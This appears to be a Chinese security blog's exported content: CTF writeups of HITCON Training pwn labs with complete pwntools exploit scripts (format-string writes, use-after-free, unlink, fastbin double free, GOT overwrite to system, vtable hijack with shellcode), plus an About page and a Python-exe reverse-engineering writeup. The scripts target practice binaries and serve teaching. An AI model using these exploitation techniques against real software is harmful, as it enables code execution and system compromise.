want to write byte by byte, short by short or int by int (hhn, hn or n) overflows (int) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string strategy (str) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes) Returns: The payload in order to do needed writes 主要用到的就是前2个参数： offset：第一个格式化字符存放的位置偏移。 如何得到这个偏移，其实最简单的就是直接%X打印栈，如下 # ./crack What your name ? aaaa.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X Hello ,aaaa.FFAD7FC8.63.0.F7FA3A9C.3.F7F75410.1.0.1.61616161.2E58252E.252E5825.58252E58.2E58252E ��\u0004��H���Your password :11 Goodbyte 格式化字符串第一个字符aaaa其位置通过不停的打印栈可以得到在偏移10(0xa)位置出现，偏移以0开始，便可以直接得到此参数为10。 writes：一个字典，用来写数据，以 {addr: value, addr2: value2,…}将value写入addr位置。 numbwritten：如果printf前面还有打印的字符，就需要设置这个参数 write_size：写入的大小，是每次单字节写入，还是一次写入双字节，还是一次写入四个字节。 ","date":"2021-02-19","objectID":"/hitcon-training/:7:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab8 格式化字符串, 目的是写大的数字, 可以直接利用fmtstr_payload生成payload #codinf=utf-8 from pwn import * context.terminal = [\"tmux\", \"split\", \"-h\"] context.log_level = \"debug\" r = process(\"./craxme\") gdb.attach(r, \"\"\" b *0x80485c6 c \"\"\") r.recvuntil(\":\") magic = 0x804a038 payload = fmtstr_payload(7, {magic: 0xFACEB00C}) r.sendline(payload) r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:8:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab9 int __cdecl main(int argc, const char **argv, const char **envp) { setvbuf(stdout, 0, 2, 0); return play(); } int play() { puts(\"=====================\"); puts(\" Magic echo Server\"); puts(\"=====================\"); return do_fmt(); } int do_fmt() { int result; // eax while ( 1 ) { read(0, buf, 200u); result = strncmp(buf, \"quit\", 4u); if ( !result ) break; printf(buf); } return result; } 这里的格式化字符串存在于bss段并不在栈上，所以不能根据第n个参数来泄露或者更改数据。 出题人把格式化串放到堆或是bss段中，不能和原来的一样那样去读取格式化字符串串中的目标地址，不在栈中你是不可能读到的。对于这种题目的做法就是要进行两次漏洞利用，第一次将当前题目变成常规题目样式。第二次就成了常规格式化字符串题目。 具体指的是： 第一次：在栈中找一个指向栈里面的指针（这种指针肯定会有，因为堆栈框架就是这样的），往其写入第二次要写入的地址。 第二次：常规格式化字符串exp操作 执行到printf函数时的栈如下: 00:0000│ esp 0xff8b5fd0 —▸ 0x804a060 (buf) ◂— '%6$p.%15$pstep1' 01:0004│ 0xff8b5fd4 —▸ 0x8048640 ◂— jno 0x80486b7 /* 'quit' */ 02:0008│ 0xff8b5fd8 ◂— 0x4 03:000c│ 0xff8b5fdc —▸ 0x804857c (play+51) ◂— add esp, 0x10 04:0010│ 0xff8b5fe0 —▸ 0x8048645 ◂— cmp eax, 0x3d3d3d3d /* '=====================' */ 05:0014│ 0xff8b5fe4 —▸ 0xf7f68000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 06:0018│ ebp 0xff8b5fe8 —▸ 0xff8b5ff8 —▸ 0xff8b6008 ◂— 0x0 07:001c│ 0xff8b5fec —▸ 0x8048584 (play+59) ◂— nop 08:0020│ 0xff8b5ff0 —▸ 0xf7f68d60 (_IO_2_1_stdout_) ◂— 0xfbad2887 09:0024│ 0xff8b5ff4 ◂— 0x0 0a:0028│ 0xff8b5ff8 —▸ 0xff8b6008 ◂— 0x0 0b:002c│ 0xff8b5ffc —▸ 0x80485b1 (main+42) ◂— nop 0c:0030│ 0xff8b6000 —▸ 0xf7f683dc (__exit_funcs) —▸ 0xf7f691e0 (initial) ◂— 0x0 0d:0034│ 0xff8b6004 —▸ 0xff8b6020 ◂— 0x1 0e:0038│ 0xff8b6008 ◂— 0x0 0f:003c│ 0xff8b600c —▸ 0xf7dcd647 (__libc_start_main+247) ◂— add esp, 0x10 10:0040│ 0xff8b6010 —▸ 0xf7f68000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 ... ↓ 12:0048│ 0xff8b6018 ◂— 0x0 13:004c│ 0xff8b601c —▸ 0xf7dcd647 (__libc_start_main+247) ◂— add esp, 0x10 14:0050│ 0xff8b6020 ◂— 0x1 15:0054│ 0xff8b6024 —▸ 0xff8b60b4 —▸ 0xff8b792a ◂— './playfmt' 16:0058│ 0xff8b6028 —▸ 0xff8b60bc —▸ 0xff8b7934 ◂— 'LANG=C.UTF-8' 17:005c│ 0xff8b602c ◂— 0x0 ... ↓ 1a:0068│ 0xff8b6038 —▸ 0xf7f68000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 1b:006c│ 0xff8b603c —▸ 0xf7f9ec04 ◂— 0x0 1c:0070│ 0xff8b6040 —▸ 0xf7f9e000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f40 1d:0074│ 0xff8b6044 ◂— 0x0 1e:0078│ 0xff8b6048 —▸ 0xf7f68000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 ... ↓ 20:0080│ 0xff8b6050 ◂— 0x0 21:0084│ 0xff8b6054 ◂— 0x87314245 22:0088│ 0xff8b6058 ◂— 'U\\x0c](' 23:008c│ 0xff8b605c ◂— 0x0 ... ↓ 26:0098│ 0xff8b6068 ◂— 0x1 27:009c│ 0xff8b606c —▸ 0x8048400 (_start) ◂— xor ebp, ebp 28:00a0│ 0xff8b6070 ◂— 0x0 29:00a4│ 0xff8b6074 —▸ 0xf7f8f010 (_dl_runtime_resolve+16) ◂— pop edx 2a:00a8│ 0xff8b6078 —▸ 0xf7f89880 (_dl_fini) ◂— push ebp 2b:00ac│ 0xff8b607c —▸ 0xf7f9e000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f40 2c:00b0│ 0xff8b6080 ◂— 0x1 2d:00b4│ 0xff8b6084 —▸ 0x8048400 (_start) ◂— xor ebp, ebp 2e:00b8│ 0xff8b6088 ◂— 0x0 2f:00bc│ 0xff8b608c —▸ 0x8048421 (_start+33) ◂— hlt 30:00c0│ 0xff8b6090 —▸ 0x8048587 (main) ◂— lea ecx, [esp + 4] 31:00c4│ 0xff8b6094 ◂— 0x1 32:00c8│ 0xff8b6098 —▸ 0xff8b60b4 —▸ 0xff8b792a ◂— './playfmt' 33:00cc│ 0xff8b609c —▸ 0x80485c0 (__libc_csu_init) ◂— push ebp 34:00d0│ 0xff8b60a0 —▸ 0x8048620 (__libc_csu_fini) ◂— ret 35:00d4│ 0xff8b60a4 —▸ 0xf7f89880 (_dl_fini) ◂— push ebp 36:00d8│ 0xff8b60a8 —▸ 0xff8b60ac —▸ 0xf7f9e918 ◂— 0x0 37:00dc│ 0xff8b60ac —▸ 0xf7f9e918 ◂— 0x0 38:00e0│ 0xff8b60b0 ◂— 0x1 39:00e4│ 0xff8b60b4 —▸ 0xff8b792a ◂— './playfmt' 3a:00e8│ 0xff8b60b8 ◂— 0x0 3b:00ec│ 0xff8b60bc —▸ 0xff8b7934 ◂— 'LANG=C.UTF-8 大致需求是： 栈上存放了__libc_start_main地址，可以用来计算libc地址,同时由于涉及到利用栈上变量当跳板，需要泄露出esp的值。这样就可以得到此时esp值和lib_start_main地址，进一步得到libc地址与system地址。 需要存放了栈上地址的栈地址作为跳板，形象地说就是：栈地址-\u003e栈地址-\u003e栈地址(这个之所以选择栈地址的目的就是为了尽量减少需要修改的字节数量，毕竟数量一多格式化字符串前面的%{n}c就越大，也就越慢了，甚至解不出来) 可以选择0x15 0x16 0x15-\u003e0x39-\u003e栈地址 0x16-\u003e0x3b-\u003e栈地址 需要存放0x0804xxxx的栈地址，这样的目的是got表也是0x0804xxxx，这样可以只用修改低2字节。 \"\"\" 1. 0x15存放的0x39处地址，在此处利用漏洞(%21$hn)将0x39处值修改为0x7地址 2. 0x16存放的0x3b处地址，在此处利用漏洞(%22$hn)将0x3b处值修改为0xb地址 3. 此时0x39存放的0x7地址，0x3b存放的0xb地址 4. 在0x39处利用漏洞(%57$hn)利用漏洞将0x7处存放的值改为printf_got地址 5. 在0x3b处利用漏洞(%59$hn)利用漏洞将0xb处存放的值改为printf_got+2地址 6. 至此已经将printf_got以及printf_got+2地址放入了栈上0x7和0xb处。 7. 利用漏洞将printf_","date":"2021-02-19","objectID":"/hitcon-training/:9:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab10 note的数据结构如下: struct note { void (*printnote)(); char *content ; }; 在delete功能中存在UAF，可以覆盖printnote函数的指针。 #coding=utf-8 from pwn import * context.log_level = \"debug\" context.terminal = [\"tmux\", \"split\", \"-h\"] r = process(\"./hacknote\") def addNote(size, content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content) def deleteNote(idx): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) def printNote(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) magic = 0x8048986 addNote(32, \"aa\") addNote(32, \"aa\") deleteNote(0) deleteNote(1) addNote(8, p32(magic) + \"aaa\") r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:10:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab11 在change_item方法中存在overflow，有多种利用方式 itemlist的数据结构: struct item{ int size ; char *name ; }; ","date":"2021-02-19","objectID":"/hitcon-training/:11:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"1. 修改top chunk大小，再分配chunk，实现地址任意写 第一次malloc会将heap分成两个chunk，第一块是分配出去的chunk，剩下的空间被视为top chunk，之后分配空间不足时会将top chunk切出。 在没有进行add item操作之前就存在一个chunk，用于存储hello_message和goodbye_message的函数指针。最终执行exit功能的时候会调用goodbye_message方法，可以首先修改top chunk的大小，达到任意写，然后修改goodbye_message方法的指针。 #coding=utf-8 from pwn import * context.log_level = \"debug\" context.terminal = [\"tmux\", \"split\", \"-h\"] r = process(\"./bamboobox\") def addItem(size, content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content) def changeItem(idx, size, content): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content) def deleteItem(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx)) addItem(0x60, \"aa\") changeItem(0, 0x70, \"a\"*0x60 + p64(0) + p64(0xffffffffffffffff)) addItem(-160, \"aa\") addItem(16, p64(0x400D49) + p64(0x400D49)) r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:11:1","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"2. 利用unlink调用magic函数 这里主要是构造能够通过检查的chunk数据 addItem(0x80,\"a\"*8) #chunk0 addItem(0x80,\"b\"*8) #chunk1 addItem(0x80,\"c\"*8) #chunk2 #需要注意，这三个chunk的大小都要保证不在fastbin的范围内 #因为fastbin的size的p位默认为1，就无法进行unlink操作 FD = 0x6020c8 - 3*8 #在bss段，0x6020c8恰好存储了chunk0的指针 BK = FD +8 payload1 = p64(0)+p64(0x81)+p64(FD)+p64(BK)+\"a\"*0x60 payload1 += p64(0x80)+p64(0x90) changeItem(0,0x90,payload1) deleteItem(1) #构造一个假的大小为0x80的fake_chunk，同时通过堆溢出 #将chunk1的pre_size和size进行修改，使得size的p位为0 #在free掉chunk1的时候，fake_chunk和chunk1就会进行合并 #这时就会对fake_chunk进行unlink操作 #这时就要对FD和BK进行精心构造，使得能够绕过unlink的检查 #也就是使得：FD-\u003ebk = p \u0026\u0026 BK-\u003efd = p #在通过检查后，unlink会导致：*p=p-3*8=0x6020c8 - 3*8 payload2 = p64(0)+p64(0)+p64(0x80)+p64(FD)+p64(0x80)+p64(atoi_got) changeItem(0,len(payload2),payload2) changeItem(1,0x10,p64(magic)) #这时向chunk0中输入内容，实际上也就是向0x6020c8 - 3*8中输入内容 #可以修改chunk_list，从而构造 UAF r.recvuntil(\"Your choice:\") r.sendline(\"5\") r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:11:2","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab12 fastbin double free漏洞，利用double free修改fd使得下下次malloc该chunk的时候可以取得自己想要的位置。 在下一次malloc(bytes)的时候，根据bytes的大小取得index后，到对应的fastbin找，取出后检查该chunk的(unsigned long)size是否属于该fastbin。 但比较的时候是先以fastbin中第一个size取得fastbin的index，再去用这个index跟刚刚算的index是否相同，不过这里取index的方式是用unsigned int(4 byte)，所以伪造时不用满足8 byte 因为没有检查alignment所以不一定要以8的倍数作为chunk的address #coding=utf-8 from pwn import * context.log_level = \"debug\" context.terminal = [\"tmux\", \"split\", \"-h\"] r = process(\"./secretgarden\") def raiseFlower(size, name, color): r.recvuntil(\"Your choice : \") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name) r.recvuntil(\":\") r.sendline(color) def removeFlower(idx): r.recvuntil(\"Your choice : \") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) raiseFlower(0x50, \"aaa\", \"blue\") raiseFlower(0x50, \"bbb\", \"red\") removeFlower(0) removeFlower(1) removeFlower(0) fakechunk = 0x601ffa raiseFlower(0x50, p64(fakechunk), \"red\") raiseFlower(0x50, \"aaa\", \"blue\") raiseFlower(0x50, \"bbb\", \"blue\") magic = 0x400c7b payload = 'a'*6 + p64(0) + p64(magic) + p64(magic) raiseFlower(0x50, payload, \"xxx\") r.interactive() pwndbg\u003e heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x9e40d0 --\u003e 0x9e4040 --\u003e 0x601ffa (size error (0x168000000000060)) --\u003e 0xf1000007f8c1ec3 (invaild memory) (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x9e4160 (size : 0x1fea0) last_remainder: 0x0 (size : 0x0) unsortbin: 0x pwndbg\u003e x/30gx 0x601ff8 0x601ff8: 0x0000000000000000 0x0000000000601e28 0x602008: 0x00007f8c1ec30168 0x00007f8c1ea20f10 0x602018: 0x00007f8c1e6c3540 0x00007f8c1e6ae6a0 0x602028: 0x00000000004007b6 0x00007f8c1e694810 0x602038: 0x00007f8c1e7b1a30 0x00007f8c1e70b280 0x602048: 0x00007f8c1e7369a0 0x00007f8c1e736310 0x602058: 0x00007f8c1e65f750 0x00007f8c1e6743d0 0x602068: 0x00007f8c1e6c3180 0x00007f8c1e6aee80 0x602078: 0x00007f8c1e7360f0 0x00007f8c1e675e90 0x602088: 0x00007f8c1e6aa4e0 0x0000000000400886 0x602098: 0x0000000000000000 0x0000000000000000 0x6020a8: 0x0000000000000000 0x0000000000000000 0x6020b8: 0x0000000000000000 0x00007f8c1ea04620 0x6020c8 \u003ccompleted\u003e: 0x0000000300000000 0x0000000000000000 0x6020d8: 0x0000000000000000 0x00000000009e3010 pwndbg\u003e x/30gx 0x601ffa 0x601ffa: 0x1e28000000000000 0x0168000000000060 0x60200a: 0x0f1000007f8c1ec3 0x354000007f8c1ea2 0x60201a: 0xe6a000007f8c1e6c 0x07b600007f8c1e6a 0x60202a: 0x4810000000000040 0x1a3000007f8c1e69 0x60203a: 0xb28000007f8c1e7b 0x69a000007f8c1e70 0x60204a: 0x631000007f8c1e73 0xf75000007f8c1e73 0x60205a: 0x43d000007f8c1e65 0x318000007f8c1e67 0x60206a: 0xee8000007f8c1e6c 0x60f000007f8c1e6a 0x60207a: 0x5e9000007f8c1e73 0xa4e000007f8c1e67 0x60208a: 0x088600007f8c1e6a 0x0000000000000040 0x60209a: 0x0000000000000000 0x0000000000000000 0x6020aa: 0x0000000000000000 0x0000000000000000 0x6020ba: 0x4620000000000000 0x000000007f8c1ea0 0x6020ca: 0x0000000000030000 0x0000000000000000 0x6020da: 0x3010000000000000 0x40b000000000009e 在0x601ffa中只会检查最后四字节，会通过大小的检查。 还可以通过UAF泄露unsortbin的地址， linux中使用free()进行内存释放时，不大于 max_fast （默认值为 64B）的 chunk 被释放后，首先会被放到 fast bins中，大于max_fast的chunk或者fast bins 中的空闲 chunk 合并后会被放入unsorted bin中（参考glibc内存管理ptmalloc源码分析一文） ​ 而在fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出main_arena的实际地址，结合偏移值从而得到libc的加载地址。 首先通过unsorted_bin，free掉一个chunk，让它进入unsorted_bin表，使得fd指向表头，然后通过泄漏出的地址，通过一顿偏移的操作，泄漏出malloc_hook的地址，进而泄漏出libc的基址 利用double-free，使得下一个新创建的chunk会落在malloc_hook上，进而改了malloc_hook的地址，改变程序执行流程 借助one_gadget \"\"\" # one_gadget /lib/x86_64-linux-gnu/libc.so.6 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf0364 execve(\"/bin/sh\", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1207 execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL \"\"\" #encoding:utf-8 from pwn import * context(os=\"linux\", arch","date":"2021-02-19","objectID":"/hitcon-training/:12:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab13 off-by-one，可以覆盖下一次chunk的size create两个chunk，用chunk0溢出到chunk1 的size位，然后free掉chunk1 申请一个新的chunk2，使得chunk2落在chunk1size的部分从而修改指针 改free的got表为system的地址，然后使得chunk0 的内容为/bin/sh，接着free（chunk0）从而getshell #coding=utf-8 from pwn import * #context.log_level = \"debug\" r = process(\"./heapcreator\") elf = ELF(\"./heapcreator\") libc = elf.libc def createHeap(size, content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content) def editHeap(idx, content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(content) def deleteHeap(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\":\") r.sendline(str(idx)) def showHeap(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) createHeap(0x18, \"aaa\") createHeap(0x10, \"bbb\") editHeap(0, \"/bin/sh\\x00\" + \"a\"*0x10 + p64(0x41)) deleteHeap(1) free_got = 0x602018 off_free = 0x3e3ec0 off_system = 0x453a0 createHeap(0x30, \"a\"*24 + p64(21) + p64(0x30) + p64(free_got)) showHeap(1) r.recvuntil(\"Content : \") free = u64(r.recv(6).ljust(8, \"\\x00\")) success(\"free address \" + hex(free)) libc_base = free - libc.symbols[\"free\"] success(\"libc_base: \" + hex(libc_base)) system = libc_base + libc.symbols[\"system\"] success(\"system: \" + hex(system)) editHeap(1, p64(system)) deleteHeap(0) r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:13:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab14 利用unsortbin的bk 首先，释放一个chunk到 unsorted bin 中。 接着利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 \u0026magic-16，再一次分配chunk的时候就会触发漏洞，会把magic的值改成一个大的数值 对于unsort bin来说，下一次malloc时会先看unsort bin中是否有适合的chunk，找不到的话才会去对应的bin中寻找，此时会顺便把unsort bin的chunk放到对应的bin中。所以无论malloc的大小(大于144)，unsort bin都会有unlink操作。 #coding=utf-8 from pwn import * r = process(\"./magicheap\") def createHeap(size, content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content) def editHeap(idx, size, content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx)) r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(content) def delete(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx)) createHeap(0x30, \"aaa\") createHeap(0x80, \"bbb\") createHeap(0x30, \"ccc\") delete(1) magic = 0x6020C0 editHeap(0, 0x100, \"a\"*0x30 + p64(0) + p64(0x91) + p64(0) + p64(magic - 0x10)) createHeap(0x80, \"bbb\") r.interactive() ","date":"2021-02-19","objectID":"/hitcon-training/:14:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"lab15 animallist中存储的数据结构: struct{ void *animal_vptr; char name[24]; int weight; } 在Dog的构造函数中存在overflow，可以覆盖虚表指针 首先new 两个dog，然后earse 0, 再次new，这样会把之前earse的空间分配给这一次。利用overflow可以覆盖上一个的虚表指针。 #encoding:utf-8 from pwn import * context(os=\"linux\", arch=\"amd64\",log_level = \"debug\") p = process(\"./zoo\")#, aslr=0 elf = ELF(\"./zoo\") libc = elf.libc #------------------------------------- def sl(s): p.sendline(s) def sd(s): p.send(s) def rc(timeout=0): if timeout == 0: return p.recv() else: return p.recv(timeout=timeout) def ru(s, timeout=0): if timeout == 0: return p.recvuntil(s) else: return p.recvuntil(s, timeout=timeout) def debug(msg=''): gdb.attach(p,'') pause() def getshell(): p.interactive() #------------------------------------- shellcode = asm(shellcraft.sh()) def add_dog(name,weight): ru(\":\") sl(\"1\") ru(\":\") sl(name) ru(\":\") sl(str(weight)) def remove(idx): ru(\":\") sl(\"5\") ru(\":\") sl(str(idx)) def listen(idx): ru(\":\") sl(\"3\") ru(\":\") sl(str(idx)) #gdb.attach(p,\"b *0x40193E\\nc\\n\") nameofzoo = 0x605420 ru(\":\") sl(shellcode + p64(nameofzoo)) add_dog(\"a\"*8,0) add_dog(\"b\"*8,1) remove(0) fake_vptr = nameofzoo + len(shellcode) add_dog(\"c\"*72 + p64(fake_vptr),2) #pause() listen(0) getshell() ","date":"2021-02-19","objectID":"/hitcon-training/:15:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":["writeup"],"content":"参考链接 https://xz.aliyun.com/t/3902 https://www.sec4.fun/2020/07/15/hitcon-training-writeup https://www.anquanke.com/post/id/186447 https://introspelliam.github.io/2017/08/07/int-80h%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/ ","date":"2021-02-19","objectID":"/hitcon-training/:16:0","tags":null,"title":"HITCON Training","uri":"/hitcon-training/"},{"categories":null,"content":"ME [+] ep [+] BUPT \u0026\u0026 天枢Dubhe [+] ypinglinkle@gmail.com  以前学语文的时候总会觉得阅读理解矫情，写作麻烦。如今年纪渐长，想下笔写些东西却不知从何写起了。今天天气很好，是个雨天。我喜欢下雨天，喜欢蜷缩在沙发的角落，小毯子盖过头，开着电视，一边听声音，一边胡思乱想的日子。胡思乱想的内容早早忘了，却还记得那些悠闲舒适的雨天。 　地球表面的影像停止了移动，那双眼睛的视野固定在非洲大陆上，这个大陆正处于地球黑夜的一侧，看上去是一个由稍亮些的大洋三面围绕的大墨块。显然大陆上的什么东西吸引了这双眼睛的注意，焦距拉长，非洲大陆向前扑来，很快占据了整个画面，仿佛观察者正在飞速冲向地球表面。陆地黑白相间的色彩渐渐在黑暗中显示出来，白色的是第四纪冰期的积雪，黑色部分很模糊，是森林还是布满乱石的平原，只能由人想像了。镜头继续拉近，一个雪原充满了画面，显示图像的正方形现在全变成白色了，是那种夜间雪地的灰白色，带着暗暗的淡蓝。在这雪原上有几个醒目的黑点，很快可以看出那是几个人影，接着可以看出他们的身型都有些驼背，寒冷的夜风吹起他们长长的披肩乱发。图象再次变黑，一个人仰起的面孔充满了画面，在微弱的光线里无法看清这张面孔的细部，只能看出他的眉骨和颧骨很高，嘴唇长而薄。镜头继续拉近这似乎已不可能再近的距离，一双深陷的眼睛充满了画面，黑暗中的瞳仁中有一些银色的光斑，那是映在其中的变形的星空。 　图像定格，一声尖利的鸣叫响起，排险者告诉人们，预警系统报警了。 　“为什么？”总工程师不解地问。 　“这个原始人仰望星空的时间超过了预警阀值，已对宇宙表现出了充分的好奇，到此为止，已在不同的地点观察到了十例这样的超限事件，符合报警条件。” 　“如果我没记错的话，你前面说过，只有当有能力产生创世能级能量过程的文明出现时，预警系统才会报警。” 　“你们看到的不正是这样一个文明吗？” 　人们面面相窥，一片茫然。 　排险者露出那毫无特点的微笑说：“这很难理解吗？当生命意识到宇宙奥秘的存在时，距它最终解开这个奥秘只有一步之遥了。”看到人们仍不明白，他接着说：“比如地球生命，用了四十多亿年时间才第一次意识到宇宙奥秘的存在，但那一时刻距你们建成爱因斯坦赤道只有不到四十万年时间，而这一进程最关键的加速期只有不到五百年时间。如果说那个原始人对宇宙的几分钟凝视是看到了一颗宝石，其后你们所谓的整个人类文明，不过是弯腰去拾它罢了。” 　丁仪若有所悟地点点头：“要说也是这样，那个伟大的望星人！” 　排险者接着说：“以后我就来到了你们的世界，监视着文明的进程，像是守护着一个玩火的孩子，周围被火光照亮的宇宙使这孩子着迷，他不顾一切地把火越燃越烧旺，直到现在，宇宙已有被这火烧毁的危险。” ——《朝闻道》刘慈欣 ","date":"2021-01-08","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Friends 我最爱的e0同学：https://e0hyl.github.io/BLOG-OF-E0/ 征哥ddw：https://ama2in9.top/ Sissel：https://sisselcbp.github.io/ Harmoc：https://harmoc.com/ ","date":"2021-01-08","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Links ida-python: https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml CyberChef: https://gchq.github.io/CyberChef/ apidocs: https://tool.oschina.net/apidocs ","date":"2021-01-08","objectID":"/about/:3:0","tags":null,"title":"About","uri":"/about/"},{"categories":["writeup"],"content":"帮忙做了一个re题，题目挺简单的，是python 的exe解包，做了还是写写吧hhh ","date":"2020-11-07","objectID":"/iisc2020-%E7%BA%BF%E4%B8%8B%E8%B5%9Bre/:0:0","tags":null,"title":"IISC2020-线下赛re","uri":"/iisc2020-%E7%BA%BF%E4%B8%8B%E8%B5%9Bre/"},{"categories":["writeup"],"content":"python exe解包 首先利用pyinstxtractor脚本将.exe文件转为.pyc文件，指令格式为 python pyinstxtractor.py exe文件名称 执行完成之后会生成一个xxx_extracted文件夹，反编译之前先把struct文件中E3之前的字符复制到想要反编译的文件中 这道题需要反编译的文件是snake 补完头部信息之后可以用uncompyle6反编译uncompyle6 snake.pyc \u003e snake.py # uncompyle6 version 3.7.4 # Python bytecode 3.7 (3394) # Decompiled from: Python 3.8.3 (default, Jul 2 2020, 17:30:36) [MSC v.1916 64 bit (AMD64)] # Embedded file name: snake.py # Compiled at: 1995-09-28 00:18:56 # Size of source mod 2**32: 272 bytes import hashlib, sys, random, time maze = [ [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0], [0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0], [0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0], [0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0], [0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0], [0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0], [0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0], [0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0], [0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0], [0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 9]] s = str(input()) seed = time.time() random.seed(seed) random.seed(random.randint(0, 999999)) maze[1][1] = random.randint(987, 1000) maze[3][4] = random.randint(345, 356) maze[7][7] = random.randint(107, 116) maze[11][8] = random.randint(833, 856) for i in range(12): for j in range(12): tmp = 12 * i + j if maze[i][j] == 0: maze[i][j] = 3456 + tmp continue if tmp % 4 == 0: random.seed(maze[1][1]) for cnt in range(tmp): random.randint(0, 999) maze[i][j] = random.randint(0, 999) elif tmp % 4 == 1: random.seed(maze[3][4]) for cnt in range(tmp): random.randint(555, 1234) maze[i][j] = random.randint(555, 1234) elif tmp % 4 == 2: random.seed(maze[7][7]) for cnt in range(tmp): random.randint(777, 888) maze[i][j] = random.randint(777, 888) elif tmp % 4 == 3: random.seed(maze[11][8]) for cnt in range(tmp): random.randint(369, 777) maze[i][j] = random.randint(369, 777) maze[11][11] = 9 if len(s) != 56: sys.exit(-1) idx1 = 0 idx2 = 0 for i in s: if i == 'w': idx1 -= 1 else: if i == 's': idx1 += 1 else: if i == 'a': idx2 -= 1 else: if i == 'd': idx2 += 1 if not 0 \u003c= maze[idx1][idx2] \u003c= 1234: print('Where are you going?') sys.exit(2) if maze[idx1][idx2] != 9: print('You lost in the maze!') result = '' for xx in maze: for xxx in xx: result += str(xxx) hash_res = hashlib.sha256(result.encode('latin-1')).hexdigest() print(hash_res) if hash_res == 'f1793dcf5ad3858512b944ac34413725a27c63e25618858231e88b9686466b00': flag1 = str(maze[1][1]) + str(maze[7][7]) + 